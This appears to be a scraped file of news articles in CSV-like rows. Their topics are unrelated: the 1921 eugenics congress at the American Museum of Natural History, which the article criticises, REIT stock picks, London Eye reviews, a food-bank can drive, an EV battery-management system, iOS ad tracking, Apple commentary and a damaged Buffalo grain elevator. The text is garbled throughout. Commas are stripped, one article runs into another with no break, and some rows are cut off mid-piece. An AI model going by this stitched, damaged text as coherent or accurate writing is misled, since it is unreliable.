exhibition prowess was the perfect place to do it.

. So some of the very best geneticists and biologists of the time were invited to contribute papers in the first session of the meeting. Osborn was particularly aggressive in asking some of the best genetic and anthropological minds to attend—Thomas Hunt Morgan (1866-1945) then at Columbia University; Hermann Joseph Muller (1890-1967) at the University of Texas; Calvin Bridges (1889-1938) also at Columbia University with Morgan; Sewall Wright (1889-1988) then at the U.S. Department of Agriculture; and R. A. Fisher (1890-1962) at Rothamsted Experimental Station in the UK. All accepted Osborn’s invitation. Osborn had hoped to attract two giants of biology and anthropology respectively—William Bateson (1861-1926) director of the John Innes Horticultural Institution in the UK and Franz Boas (1858-1942). Bateson rejected the invitation because he wanted to keep pure science separate from the applied science of eugenics. Boas had been a curator of anthropology at AMNH before moving to Columbia University in 1905and had remained in contact with Osborn since his departure from the museum. There was probably no chance he would attend however as he was a staunch anti-eugenicist. In 1916 five years before the SecondCongress he published a clear rejection of eugenics. He did not attend the meeting and continued to write disparagingly of eugenics throughout his career. His rationale for rejecting eugenics was that from an anthropological standpoint humans were incredibly complex and deciphering the genetic basis of their behavior was an impossible task. Boas summarized his rejection of eugenics with the following quote: “How much can be and should be attempted in this field depends upon the results of careful studies of the law of heredity. Eugenics is not a panacea that will cure human ills it is rather a dangerous sword that may turn its edge against those who rely on its strength.”Acceptance to attend the gathering by some of Osborn’s invited scientists is not surprising in retrospect. Ten years after the Second Congress R. A Fisher made it clear in his book The Genetical Theory of Natural Selection that his leanings were eugenical. In an otherwise brilliant treatise on the role of genetics in natural selection the last five chapters of the book are bold declarations of the inevitability—to Fisher—of eugenical thinking. However there were several eminent geneticists on the agenda who gave talks that were of interest to geneticists of the day (and to present day geneticists). Muller made clear that he “denounced the American eugenics movement as sexist racist and based on spurious elitism.” Morganhad chastised eugenical thinking in 1915 because of “reckless statements and the unreliability of a good deal that is said” by eugenicists. Nevertheless both Morgan and Muller attended the Congress.The second section of the meeting focused on eugenics and the family. With talks with such titles as “An Ideal Family History” “Measurement of Family Resemblances in Intellect” and “Some Families as Factors in Anti-Social Conditions” the organizers tried to extend the scientific genetic context of human behavior and morals to explain familial resemblance. This section was essential to expand the reach of science to the study of familial resemblance and was an important cog in validating the pseudoscience that was to emerge from future eugenic studies of familial resemblance. The section on eugenics and the state was essential to the eugenics movement because it emphasized the importance of the state in eugenical solutions to so-called poor racial and familial genetic hygiene. It is in this section that Laughlin presented a paper entitled “Eugenical sterilization in the United States.” Laughlin asserted that states have an “undoubted right to prevent reproduction by persons of proven degenerate stock “because such reproduction produces children who present a “drag upon the self-supporting portion of the commonwealth.” Unfortunately sterilization laws were passed in thirty states. The last forced sterilization law in the United States was repealed in North Carolina in 2003 but there have been reported incidences as recently as 2010 of coerced sterilizations of incarcerated females in state prison systems.

was that on human so-called racial differences. Some of the more aggressively racist exhibits had such titles as “Personal Beauty and Racial Betterment” “Racial differences in human fetuses” “Racial Differences in Mental Fatigue” “Display of The Rising Tide of Color against White World-Supremacy” and “Statuette of the Average American White Soldier”—all of which were considered mainstream eugenics at the time. One of the most racist of exhibits was from a trustee of AMNH Madison Grant (1865-1937) a funder and shaper of the Second Congress and the author of the 1916 book The Passing of the Great Race. Osborn had written an enthusiastic introduction to the book. A fellow AMNH trustee German-born banker Felix Warburg (1871-1937) was so irate that he demanded an academic investigation into Osborn’s behavior. However a majority of the trustees decided that “there was no need for anyone to feel offended.”was the exhibition space on the first floor. Technically not an exhibition with separate themed exhibits it resembled more a poster session because participants were invited to contribute their own exhibits. Also the public was invited to view the 131 exhibits—which is rarely done with poster sessions at scientific meetings today. As C. C. Little explained in his description of the Congress this was an integral part of the eugenics exhibition—to educate the public and convince them that eugenics should be taken seriously.The exhibits came mainly from several governmental and non-governmental agencies three companies individuals at nineteen well-respected universities two museums and sixteen publishing houses or journals promoting their eugenic writing products and books. Of the seventy-nine exhibits from individuals or breeding associations nineteen were on animal or plant breeding. Intelligence was also a major focus with fourteen exhibits—five of which were on human intelligence differences between groups of people and nine were on feeble-mindedness. There were several exhibits that attempted to give museum visitors a basic education on genetics heredity and eugenics. The presence of so many exhibits on animal and plant breeding conveyed the notion that selective breeding could be applied to humans.Apparently the goals of the Congress as outlined by C. C. Little were attained because the reach of eugenics expanded after 1921. In 1926 the American Eugenics Society (AES) was established by several of the organizers of the 1921 meeting—Madison Grant Harry H. Laughlin and Henry F. Osborn. Members of the AES were either the editors of journals or high-ranking society officers of the Genetical Society of America the American Association for the Advancement of Science the American Genetics Association (formerly the American Breeders Association) the American Medical Association and the American Society of Human Genetics.Another outcome of the Second Congress was that in 1932 the Third International Congress of Eugenics was again held at AMNH. A volume of scientific papers from that meeting entitled A Decade of Progress in Eugenics was published in 1934 by Williams & Wilkins. Except for a few papers (out of sixty-five) on human genetics the Third Congress lacked a genetic context. It could be claimed that there was significant spread of eugenic ideas in that decade but hard to characterize it as progress. Even without the genetic context eugenics grew in popularity and went on to be the root cause of some of the most heinous atrocities in the twentieth century if not human history.

Why the talks and exhibits of the Second and Third Congresses did not offend the sensibilities of the participants has been explored by such authors as public health ethicist Michael Yudell now at Arizona State University; Daniel Okrent the first public editor at the New York Times; geneticist Elof Axel Carlson professor emeritus at the State University of New York at Stony Brook; science historian Daniel Kevles at Yale University; and education professor Steven Seldon at the University of Maryland College Park. The conclusion from the collective findings by these authors is that well-respected scientists and institutions in the early– and mid-twentieth century were taken in by the lure of eugenics. They were attracted to eugenics because of its peripheral contact with their own academic interests and because eugenics had been mainstreamed by the organizers of the Second Congress.

Organizers and presenters at the First International Congress of Eugenics July 24-30 1912 at the University of London also exhorted the 750 or more attendees from Europe and North America to campaign for eugenic legislation in their home countries. However many of the speakers sounded a cautionary note. As reported in the August 1 1912 issue of Nature:

The lead given by Mr. [Arthur] Balfour [1848-1930] in his speech at the inaugural banquet in striking the keynote of diffidence and moderation was followed throughout the meeting. The application to human society of the methods found useful in the breeding pen is not advocated by the modern eugenist neither does he wish to see permanently confined or castrated all those whom he considers undesirable mentally morally or physically. He does not plead for the repeal of all humanitarian legislation or for a return to ‘the good old days of natural selection.’ He only urges that the possible eugenic or dysgenic results of fresh legislation may be seriously considered…Since the idea of practical eugenics was first mooted its scope has naturally been much increased so that there is room for a greater variety of views among those who pronounce a sort of general blessing on the eugenic ideal. This variety is expressed for instance in differences of opinion as to the relative importance of ‘nature’ and ‘nurture.’ A regrettable result has been to debase the meaning of the word ‘eugenic’ so that some speakers seemed to regard it as synonymous for ‘hygienic’ whereas originally the two words were generally used in antithesis.

By 1921 by the time of the Second Congress those cautions expressed at that first international meeting were being muted by prevailing attitudes and prejudices. By the Third Congress on the eve of a world conflict any warning about “a dangerous sword” were drowned out by the euphoria over the potential ability of eugenics to improve the human species genetically assuring that undesirable traits and people would not be replicated. For some proponents eugenics represented the “final solution.”

Many scientists who were drawn into eugenics abandoned it after realizing what it was and what it was promulgating. However formalized eugenics persisted almost to the end of the twentieth century—the AES was not disbanded until the 1990s and some of its ideas are still with us.

The American Museum of Natural History and many other institutions recognize the role they played in the eugenics movement as do Natural History and other science magazines and journals that gave a public forum to the movement. Prejudging diverse peoples and cultures predated eugenics. Accounts by anthropologists and ethnographers often reflected a researcher’s own prejudice. Ironically the expeditions to unexplored areas of the world and the study of the people who lived there advanced our knowledge and ultimately gave us a better understanding of these diverse cultures and of ourselves. --RDe"
AMT,American Tower,https://news.google.com/articles/CBMiS2h0dHBzOi8vd3d3LmZvb2wuY29tL2ludmVzdGluZy8yMDIxLzEyLzExLzMtcmVpdHMtZm9yLXRoZS1uZXh0LWJlYXItbWFya2V0L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,3 REITs for the Next Bear Market,"These stocks are likely to rebound quickly in a bear market making this a great time to buy high-quality REITs at a discount.

Assuming a market correction or even a market crash could be in the near future is not crazy thinking. The last 11 years from 2009 to early 2020 marked the longest bull market in stock market history. The market correction that came with the onset of the global pandemic in early 2020 for some signaled the end of our great ""bull run."" But given how quickly the markets recovered and have well surpassed pre-pandemic highs it seems to many that we're right back in the midst of an unstoppable bull market. Others have reason to believe in the potential for another correction.

But even if they come bull markets don't last forever. Inevitably the stock market will fall and take on the much-dreaded bear market moniker. Many of the stocks that shot up over the past decade will see some level of price correction.

Savvy investors know that bear markets are an incredible time to double down on select stocks and real estate investment trusts (REITs) because they are trading at a discount. While there are countless high-quality REITs to choose from here are three that really stand out as great buys during the next bear market.

1. American Tower

When it comes to real estate it's important to choose operators in industries that are not only backed by high demand today but will be well into the future. Growing reliance on technology data and cloud storage isn't going to change anytime soon. Providers like American Tower (AMT -1.01%) one of the largest cell tower REITs in the world and the largest REIT by market cap are a big part of what keeps our world connected. The company has a global presence operating and leasing around 219000 communication sites in Africa Latin America North America and Europe.

Despite its already massive footprint it's still expanding rapidly having acquired two data centers and 4369 new communication sites primarily in international locations in the third quarter alone while continuing its rollout of 5G technology. That 5G deployment accelerated the company's metrics in the third quarter with revenue increasing 21.9% year over year adjusted funds from operations (AFFO) growing by 13.3% and net income up 56.9%.

The company recently announced the acquisition of data center REIT CoreSite Realty (COR) for $10 billion a deal set to close by the end of the year. This move will help solidify American Tower's position as a premier provider in our data-driven world.

There's are clear continued growth opportunities here but American Tower's expensive share price makes it a hard sell in today's market. A bear market should offer a great opportunity to stock up on this top-performing REIT.

2. Prologis

Prologis (PLD -0.61%) is the largest industrial REIT operator in the world today. It is next in line behind American Tower when it comes to market cap and another behemoth company that dominates the industry it operates in. And given that industrial real estate is experiencing incredible growth and unparalleled demand it's a great industry to be in.

Prologis owns and leases roughly 4675 industrial properties which equate to nearly 1 billion square feet under management across some of the world's top markets. Voracious demand for warehouse and logistics space has pushed the company's rental rates and revenue to record highs over the past year with space being effectively sold out within its operating markets.

Effective rent rates rose 27.9% year over year in the third quarter of 2021 with a mere 3.4% vacancy rate. Historically Prologis has performed incredibly well providing investors with a 22.08% annualized return over the past 10 years and seven straight years of dividend growth.

All that being said the company is also trading at a premium meaning a bear market might present a better opportunity to grab shares in this reliable company at a reasonable price.

3. Realty Income

Retail is one of those sectors that investors either love or avoid. Considering the rise in e-commerce the future of retail has become somewhat unstable. And while retail may not look the same in 20 years as it does today it won't go away altogether. This fact makes Realty Income (O 0.70%) one of the largest and most dependable retail REITs in the market today a great buy in the event of a bear market.

Realty Income started and continues to primarily operate in the retail sector with roughly 83.7% of its portfolio being single retail properties shopping centers and malls. Over the past year however the company has dramatically expanded its portfolio into international locations and merged with VEREIT which adds to its office exposure. As of Q3 2021 Realty Income has interest or ownership in 7018 commercial properties including industrial office agriculture and retail.

The company has instituted 112 dividend increases since going public in 1994 and it maintained a 15.23% annualized return since IPO with 24 out of 25 positive years of growth. It definitely prides itself on being a dependable trustworthy REIT which has led share prices to become quite costly in recent years. A bear market would be a prime opportunity to snag this company at discounted prices while being backed by one of the highest-quality portfolios in the REIT industry today.

Compelling bear market buys

Bear markets shouldn't be feared -- they are what allow for money to be made so swiftly in the bull market that inevitably follows. Knowing what to purchase and when is key. REITs in particular can be great buys in down markets because they often pay competitive dividends while providing exposure to a diverse range of high-quality real estate assets. And these three REITs should be great buys during the next bear market.",https://news.google.com/articles/CBMiSWh0dHBzOi8vd3d3Lm15bG9uZG9uLm5ld3MvbmV3cy9oaWxhcmlvdXMtcmV2aWV3cy1sb25kb24tZXllLWxlZnQtMjI0MzM5MjHSAU1odHRwczovL3d3dy5teWxvbmRvbi5uZXdzL25ld3MvaGlsYXJpb3VzLXJldmlld3MtbG9uZG9uLWV5ZS1sZWZ0LTIyNDMzOTIxLmFtcA?hl=en-US&gl=US&ceid=US%3Aen,Hilarious of reviews of London Eye left by Americans,"We have more newsletters

The city of London is blessed with some of the most iconic buildings and attractions in the world.

From Buckingham Palace to Tower Bridge holidaymakers flock from around the world to see the sights.

One common problem for tourists is finding the time to see everything and one solution for this is to take a trip on the London Eye.

READ MORE: The hilarious reviews left by Americans about Madame Tussauds as one calls them 'spiteful' over Harry and Meghan's wax figure

The Eye which sits on the South Bank of the Thames was opened in 2000 and is the most popular paid attraction in the UK.

But not everybody who takes a ride is left impressed and a number of American tourists have left scathing reviews.

(Image: John Walton/PA Wire)

Avia from Malibu said: ""Eye thought it would be wonderful.... I was let down.

""Everyone who goes to London sees the big wheel in the sky! It is on the bank of the Thames River and is a very popular tourist attraction.

""After a very long wait you are placed inside a capsule with about 20-25 other people and you take a very slow ride once around.

""It takes 25-30 around with the only great view from when you actually reach the top.""

One common criticism the Eye faces is that it's too slow with some expecting it to offer a thrill ride.

Suzanne from Stamford said: ""Don’t waste your money...if you’re looking for a ride this isn’t it.

""The wheel moves so slow you can barely tell you’re moving.

She added: ""If you’re looking for a beautiful view of London I suggest The Shard it’s included in the London Pass and has much better views.

""If the car you’re in is crowded and you don’t get a spot near the front of the car the views are just so-so.""

Another American added: ""Waste of time. Great view of the city.

""It was neither exciting or scary and was very slow.""

Another reviewer repeatedly called it the 'Eye of London' while another called it 'London's i'.

However it seems like a few Brits themselves found American tourists amusing.

One TripAdvisor reviewer from Bristol said the the group of Americans in his pod were convinced they'd spotted the Eiffel tower.

The decorative displays were part of Food Share's 10th annual CAN-tree Drive. The event brought together volunteers from local businesses schools and community groups to showcase 160000 pounds of canned goods stacked into tree shapes.

""This is our biggest food drive of the year"" said Vivien Minton marketing director for Ventura County's food bank.

The stacked cans were embellished with bows handmade ornaments custom labels and other holiday decorations.

Last year as the COVID-19 pandemic limited in-person gatherings Food Share hosted the campaign virtually. People built canned trees in their yards or businesses and posted photos on social media with community members voting for favorites.

This year the awards are back in person for ""lighthearted fun"" Minton said.

About 200 trees had been built around the plaza. Anchoring the scene were four large trees near the fountain that stood 15 feet tall. Crews of about a dozen people started building the 15-foot trees Wednesday morning. The tall trees which weigh about 10000 pounds and require an internal structure with concrete platforms take about 4 hours to complete.

The canned trees will be on display through Saturday. The cans are scheduled to be taken down Sunday although the timing might change depending on weather.

The canned goods are ultimately are taken to the food bank's warehouse to be sorted and inspected before they are distributed in boxes to food pantries throughout the county.

You can still help with the effort. On Saturday tip jars will be set out at the plaza for cash donations.

Canned goods can be dropped off at Food Share's warehouse in Oxnard at 4156 Southbank Road.

For information on donating or volunteering go to foodshare.com or call 805-983-7100.

Sensata's BMS Integrates Hot-swap Technology - News,"As electric vehicles (EVs) continue to grow in popularity engineers must meet rigorous specifications to achieve high performance efficiency and most importantly safety.

These considerations affect two of an EVs most crucial elements: the power supply and distribution system.

While in use these systems must have excessive redundancy to continue operation amidst the failure of one part of it. Furthermore mechanics must do maintenance work without taking apart or affecting the rest of the machine to get the EV back onto the road.

When performing these actions an aspect to consider is the importance of power supplies to have a Battery Management System (BMS).

An example EV BMS block diagram. Image used courtesy of STMicroelectronics

Hoping to improve BMS and make EV maintenance easier Sensata Technologies recently announced its new i-BMS the LiBAL i-BMS15 for electrified applications up to 60 V.

Using hot-swapping technology designers can use this i-BMS solution within 2- and 3-wheeled EVs automated guided vehicles (AGVs) and robotics. With Sensata's solution in mind this article will dive into the concept of parallel pack technology and the i-BMS.

The Concept of Hot Swapping/Parallel Pack Functionality

In general parallel pack functionality or ""hot-swapping"" allows the usage of multiple battery packs in parallel with one another thus helping with the redundancy mentioned.

An example of hot-swap application diagram. Image used courtesy of Analog Devices

Hot-swapping allows users to quickly swap out dead batteries within a battery pack while the system continues running and replaces it. This ability can alleviate one of the most problematic hindrances during the switch from fossil-fuel-based vehicles to EVs as one would no longer need to wait for a full charge but can stop at a station and swap the battery with a live one without shutting the vehicle off.

For Sensata's product specifically this ability to quickly and easily swap batteries could allow electric motorbikes to have this functionality which could be a huge step forward in adopting and integrating more EVs into our lives.

Sensata's i-BMS Solution

Overall besides the hot-swapping function of the LiBAL i-BMS15 solution some specs include:

Area of only 65 mm x 200 mm

Ability to monitor up to 15 battery cells in series

High voltage (HV) measurement accuracy of +/- 100 mV

Cell balancing current of 200 mA

A +/- 0.5% current measurement accuracy of 120 A

A +/- 3% state of charge (SOC) accuracy (a SOC is the measurement of the potential energy within a battery)

A +/- 2% state of health (SOH) accuracy (a SOH measures the batteries ability to store and deliver power)

Additionally the BMS' cell chemistry is agnostic which means that the BMS can be used with different cell chemistries fitting a wider array of applications.

The LiBAL i-BMS15 packs these specs into a device that requires no external components as all components are pre-integrated to the BMS.

Some of the critical components that make up this BMS are:

A pre-charge circuit Since EVs require the charging of high capacitive loads a large inrush current spike with the ability to be thousands of amps can destroy the entire system on startup. A pre-charge circuit controls this inrush current allowing for a more steady charging of the downstream capacitance.

An onboard current measurement

MOSFET power switches Based on the current measured onboard these switches will be either turned ON or OFF to either turn on the machine or protect it when issues such as short circuits occur.

A DC/DC power supply

All in all Sensata claims that all of these components have met rigorous standards obtaining the ASIL C Safety Rating as well as including self-testing for the user to ensure critical circuit functionality.

This BMS solution offers not only robust hardware but also capable software. The software allows the user to design their specific battery topology for the system. It will also notify the user of any events and system warnings while logging data to measure SOC and SOH. The system can also predict thermal runaway regulate current dynamically and set advanced parameter settings for CAN communication.

Despite the benefits that Sensata claims to pack into its BMS with hot-swapping in mind could this type of technology really make waves when it comes to EV battery charging alternatives?

Could Hot-swapping Reach Mainstream?

Sensata is not the only player in this market far from it. Analog Devices also has hot-swap capable controllers and they highlight the design of these systems using its solution the ADM1177.

Though hot-swapping technology is still a relatively newer technology that aims to get more companies on board as it is currently a potential solution for the long charging times of EVs.

This technology is something to expect more of in the future; beyond the current applications of smaller EVs such as motorbikes and 3-wheelers this technology could one day be more widely used in full-sized EV cars and more.

As the concept of home charging and charging stations at work and other public facilities will help in the day-to-day for EVs to truly take over one of the biggest hurdles is the convenience of just filling up a gas tank rather than waiting for a full battery charge.

While many think about making batteries last longer making EVs more efficient and cost-effective is also important. One of the biggest bottlenecks will be the charging time and the impact that EV fast charging will have on our global infrastructure.

Overall this concept of hot-swapping could not only remove the time of charging but has the potential to be faster and even more convenient than pumping gas with the possibility that one would not even need to get out of their car at a station that performed battery hot-swaps.

Furthermore on a larger scale dependence on hot-swapping could remove the dependence on fast EV charging which lessens the potential burden for the electrical grid when the time comes that EVs are universally adopted.

For EVs to become the norm including hot-swapping technology into EV designs could ease the burden on the grid and lessen pit stop times. It will be interesting to see where this technology heads in the future and if other solutions come out to ease EV infrastructure and efficiency.",,,,,,,,,,,,

While asking apps to not track you does keep them from collecting and selling data tied to your personal advertising identity it doesn’t keep developers from collecting any information about you at all.

The feature introduced in iOS 14.5 is meant to prevent app-makers from tracking what you do and selling that information to advertisers. Companies like Facebook cried foul when it was introduced saying that it would hurt their ability to show targeted personalized ads and therefore hurt businesses that relied on those ads.

Companies have turned to aggregated and anonymized data which still comes from individuals

According to the Financial Times though developers have taken Apple’s rules to mean that they’re allowed to target ads at cohorts or groups that people are put into without needing to have unique IDs assigned. The report says that developers like Snap Inc. have continued collecting some data including from those who have asked them not to track them with the justification that anything that could be tied to an individual user would be anonymized and grouped.

It’s a similar concept to FLoC Google’s plan for a post-third-party cookie internet where individuals are assigned labels describing what kind of things they might buy instead of being tracked individually. Ads can still be targeted without advertisers having to keep track of everything everyone does.

Some developers have admitted though that they also try to make predictions about what users do after seeing ads based on info they receive from ad companies. The Financial Times also says that some personalized data like IP address location and screen size still makes its way to advertisers to help ensure that ads fit properly and show up in the right language.

According to the report Facebook and many other companies are planning on selling ads using aggregated or anonymized data. While Facebook partially blamed Apple’s policies for it missing its earnings goals last quarter it’s estimated that the ads affected by the rules only made up 5 percent of its annual ad revenue. In other words Apple’s ad tracking permissions were never going to destroy Facebook’s ad business.",https://news.google.com/articles/CBMiWGh0dHBzOi8vd3d3Lm1hY3dvcmxkLmNvbS9hcnRpY2xlLzU1NzgzNy9tYWNhbG9wZS1pcGhvbmUtZG9vbWVkLWhvbGlkYXlzLWRlbWFuZC1jdXRzLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Apple is getting coal this year because the iPhone is doomed,"Happy Cutmas everyone!

“Apple Tells Suppliers iPhone Demand Has Slowed as Holidays Near”

Okay well surprise we get these stories every year because sales naturally fall after the big fall release. This time it comes with some added global supply chain garment-rending so let’s see if we can follow the logic here. Without taking any dangerous drugs.

Apple Inc. suffering from a global supply crunch is now confronting a different problem: slowing demand.

Nobody wants iPhones!

…signaling that some consumers have decided against trying to get the hard-to-find item.

We’re in the second sentence and we’ve already careened off Making Sense Blvd. busted through the guardrails and exploded spectacularly over What The Actual Heck Ravine.

No one is buying the phones that Apple cannot make enough of to keep up with demand.

If you wondered why the Macalope drinks… [points accusingly at the quoted sentences above]… this. This is why. Right here. This stuff.

Already Apple had cut its iPhone 13 production goal for this year by as many as 10 million units down from a target of 90 million…

So according to this math Apple was planning on selling about 80 million units of just the iPhone 13. That’s kind of a lot of units.

The company is still on track for a record holiday season…

IDG IDG IDG

Nobody wants iPhones. Apple records record holiday season. That… you just… I don’t… why…

Apparently the idea here is that Apple is still going to sell gobs of iPhones it just isn’t going to sell the huge gobs that it thought it was going to sell. We know this because Apple is such an open book. And how Apple can be facing “slowing demand” when it already can’t keep up with the current demand is beyond this furry observer.

Long story short Apple’s clearly the biggest loser in all of Loserville. So who’s winning?

“Q3’21 Was a Record Quarter for Foldable Smartphones Samsung Enjoys a 93% Share per DSCC Report”

Huge quarter for foldable phones! Unbelievable! Just mind-bogglingly large! How big is the winning you ask? Oh well why get into the minutia when it’s all right there in the head-

Q3’21 foldable smartphone shipments were larger than the previous four quarters combined and grew 215% Q/Q and 480% Y/Y…

Wow! Well that’s all you need to know then. Case closed. Big winning. Guess we can just close this tab and go back to watching ASMR TikTok videos with the sound off and…

…to 2.6M phones.

Wait what?

Yes the entirety of the foldable phone market is practically a rounding error for Apple. And even at that low level it’s larger than the previous four quarters combined. Why are we even talking about this? Analysts have been saying that Apple better get on the foldable phone bandwagon (disclaimer: no band no wagon) quick or BE DOOMED as long ago as 2012. Nine years later the entire market is maybe 3.5 percent of Apple’s quarterly sales.

It is possible Apple might not ship as many phones as it expected. But that’s a number no one really knows even the company’s suppliers. The Macalope must insist that people chillax themselves before they must ax themselves what they’re so worked up about.",https://news.google.com/articles/CBMiY2h0dHBzOi8vaW5kaWFuZXhwcmVzcy5jb20vYXJ0aWNsZS90ZWNobm9sb2d5L29waW5pb24tdGVjaG5vbG9neS81LWNoYW5nZXMtYXQtYXBwbGUtaW4tMjAyMS03NjY3MDM3L9IBaGh0dHBzOi8vaW5kaWFuZXhwcmVzcy5jb20vYXJ0aWNsZS90ZWNobm9sb2d5L29waW5pb24tdGVjaG5vbG9neS81LWNoYW5nZXMtYXQtYXBwbGUtaW4tMjAyMS03NjY3MDM3L2xpdGUv?hl=en-US&gl=US&ceid=US%3Aen,Year in review: 5 changes at Apple in 2021,"In tech circles Apple is considered more than a tech brand. It is an institution on its own that perfectly balances mass appeal and out-of-the-box thinking. Though things have changed under the leadership of Tim Cook the core philosophy set by the late Steve Jobs remains the same. A company which is closely watched by Wall Street and consumers alike Apple has had a successful year despite facing challenges from external forces including the pandemic and increased pressure from regulators. While the world has already started speculating what products to expect from the Cupertino giant next year and beyond we observed certain things this year that not only tell us about Apple’s product strategies but also give a peek into the company’s vision of the future.

Someone within Apple deeply cares about the ‘mini’ products and wants the company to address a niche segment that still wants to use devices with small-form factors. The message that often gets misunderstood is that these products are made simply because a cash-rich company like Apple can take risks and does not care much about the commercial prospects. That’s not how Apple functions. Designing a product like the iPhone 13 mini is more complicated because you know the tight space makes it hard to fit a larger battery and yet the priority is to deliver battery life that lasts all day long.

Also read | Apple iPhone 13 mini review

For instance the new iPad mini may look like a miniature version of the iPad Air but the way the mini has been designed gives a precursor to a product that could end up being a foldable device in the near future. In their current form both the iPhone 13 mini and iPad mini are usable devices but also highly experimental in nature. Beyond laying the groundwork for new form factors devices like the iPhone 13 mini and iPad mini give Apple an edge over the competition as its rivals currently do not sell such devices.

Although Apple had offered ‘mini’ branded devices in the past as well this time around the push is to have a family of products including the HomePod mini and Mac mini that serves a specific use case and users. The idea is to stay away from associating them as ‘affordable’ devices even if in some cases the product is an entry into the Apple ecosystem.

A post-Jony Ive era

Ive leaving Apple was a big loss for the company and it would be hard to replace the celebrated industrial designer who is behind several hit products including the iPhone and iPad that made Cupertino a household name. But the exit of Ive from Apple means the company is now more independent in thinking and can design products that are more practical in their approach. The new design philosophy is already visible in the latest MacBook Pro that fixing the issues the previous model suffered from.

For example the new MacBook Pro includes an HDMI port which is exactly what photographers wanted on a professional-level notebook but Ive’s emphasis on form over function made it impossible to have that feature on the last-generation notebook. The new MacBook Pro is thicker and heavier but has gained functionalities appreciated by the users. Several new products launched by Apple throughout the year including the redesigned Siri remote for Apple TV and iPhone 13 shows that the form has taken a back seat and the priority is given to functionality.

It’s not a sign that Apple from now on will design a product based on what consumers wish to see. Apple still focuses on a product that people will buy. The difference is that the product designed in the post-Ive era will be more practical and functional but less flashy.

The rise of Beats by Dre

Until last year there was speculation that Apple might end the Beats lineup and focus entirely on the Apple-branded audio line. Well that didn’t happen. In fact Beats as a brand has gotten a real push lately and Apple spared no expense in creating all necessary hype around Beats’ new products. If you look at Beats by Dre the brand has taken the route of collaborations with hip-hop artistes and designers that truly merged the worlds of streetwear fashion and tech.

At the start of the decade headphones were seen as fundamentally uncool. Beats way before Apple acquired the brand tried to weave in headphones as part of pop culture. Distinct in crowds popular with celebrities – the aggressive street-inspired designs helped Beats products be different from the competition especially from Apple AirPods. Hiroshi Fujiwara’s Fragment design collaboration with Beats brought back the missing mojo that the brand needed to thrive in the new world where luxury and streetwear are becoming one.

Throughout the year Beats introduced several new earbuds that are priced less than Apple’s AirPods but offer a solid alternative. For example the new Beats Fit Pro has a lot of special features including active noise cancellation (ANC) and even Android support for less than the price of the AirPods Pro. The re-emphasis on Beats feels the start of things yet to come.

No price increase

Apple has since its inception built a reputation of charging a premium for its products. The brand loyalty translates to a higher price of products backed by exceptionally well-designed devices and the lure of the Apple ecosystem. But during the pandemic Apple did something that was least expected — no price increase. The iPhone 13 costs the same as last year’s model while the iPhone 13 Pro Max also costs identical to last year’s offering. Cupertino has raised prices of its popular products over the years with the iPhone being the headliner.

Experts say the pandemic prompted Apple not to increase its iPhone prices but a company of Apple’s stature can increase the price whenever it feels like doing so. Its competitors meanwhile launched premium smartphones at higher prices this year. That leaves us with the question of why did Apple not increase iPhone prices despite facing the chip shortage and supply chain issues. Is it because iPhone sales have sky high and Apple can take a hit to keep new users coming or is Apple waiting for the next-generation iPhone and then only it will increase prices? Whatever the reason prices of the iPhone Apple Watch and iPad (except for the new iPad mini)are mostly unchanged this year.

Opening up the walled garden

Although it is hard to say that cracks are appearing in Apple’s famous walled garden Cupertino still controls how it wants to operate its tightly-controlled ecosystem on its own terms. Earlier this year Apple announced its decision to open up FaceTime to non-Apple users for the first time. Now Apple allows Android and Windows users to get invites to FaceTime calls. On the surface it seems like a generous move signaling shifting of gears of sorts but there is one big caveat attached to the feature. These users for example still won’t be able to start FaceTime calls nor able to take advantage of FaceTime’s SharePlay feature. It’s a well-thought-out move that will only encourage non-Apple users to switch to an iPhone in the future.

Apple also said it would soon let users fix their iPhones and Macs by providing parts tools and manuals. The move was justifiably hailed as a major victory for the “right to repair” movement. Apple made this U-turn for a number of reasons but by doing so it has become the poster child for the war against products that resisted repair a smart PR move.",https://news.google.com/articles/CBMiigFodHRwczovL3d3dy5ibG9vbWJlcmcuY29tL25ld3MvbmV3c2xldHRlcnMvMjAyMS0xMi0xMi93aGF0LXMtaW4tYXBwbGUtcy1pb3MtMTUtMi1pcGFkb3MtMTUtMi1udWRlLWltYWdlLWRldGVjdGlvbi1sZWdhY3ktY29udGFjdHMta3gzbTNubWLSAQA?hl=en-US&gl=US&ceid=US%3Aen,What’s in Apple’s iOS 15.2 iPadOS 15.2?

When Apple releases a major new version of iOS and iPadOS—the operating systems that run on the iPhone and iPad—the move is typically only the beginning of a cycle."

The grain elevator owned by ADM Milling Co. a division of commodities giant Archers Daniel Midland at 250 Ganson St. opened for business in 1897 and was last used in 1981. It sits next to a flour mill that was added later and is still in operation.

The Great Northern is celebrated by elevator enthusiasts and preservationists for being a rare steel-bin elevator and the only brick-box elevator believed to be standing. It once was the largest grain elevator in the country.

""To some it's just a hulking brick building"" said Gwen Howard who chairs the Buffalo Preservation Board. ""But it is critically important in terms of the architectural legacy of our community.""

A similar-sized hole in the north wall from high winds occurred once before – on Jan. 20 1907 from 84-mile-per-hour gusts and was safely rebuilt. That occurred during a period when the grain elevator was known as the Mutual Elevator according to the former Buffalo Courier-Express.

James Comerford who heads the city's Department of Inspections and Permits said in a statement Sunday that ""we were out there yesterday and today. We are having a drone inspection tomorrow to determine the extent of the damage.""

Tim Tielman who edited the 1990 book ""Buffalo's Waterfront: A Guide"" that highlighted the grain elevators and wrote the landmark application when the Great Northern was locally landmarked said the brick wall was weather-protective sheathing and the damage to it doesn't threaten the building's structural integrity.

""The brick doesn't support the elevator structurally"" Tielman said. ""The steel bins support themselves and they and the framework are structurally independent so the elevator itself is in no danger of collapse.""

The one-of-a-kind colossus was locally landmarked in April 1990 by the City of Buffalo in response to an attempt by Pillsbury Co. to tear it down. ADM acquired the building in 1993 and tried to have it demolished in 1996 and again in 2003. A spokesman for Illinois-based ADM did not return a message to comment on Sunday.

The Great Northern is considered eligible for listing on the National Register of Historic Places.

Any modification to the property needs to come before the Buffalo Preservation Board with the exception of an emergency demolition which could be ordered by the city's Department of Inspections and Permits.

It's up to that department to maintain vigilance on inspections and citations and then the court process but with the office closed until Monday it wasn't possible to find out what the inspection record has been there.

""ADM bought the complex with full knowledge and eyes wide open that it was a City of Buffalo landmark"" said Tielman who is also executive director of the Campaign for Greater Buffalo. ""They are aware of the rarity of the building and consequently that when it was built it was an American engineering marvel.

""They have a civic responsibility and they need to fix the building"" Tielman said.

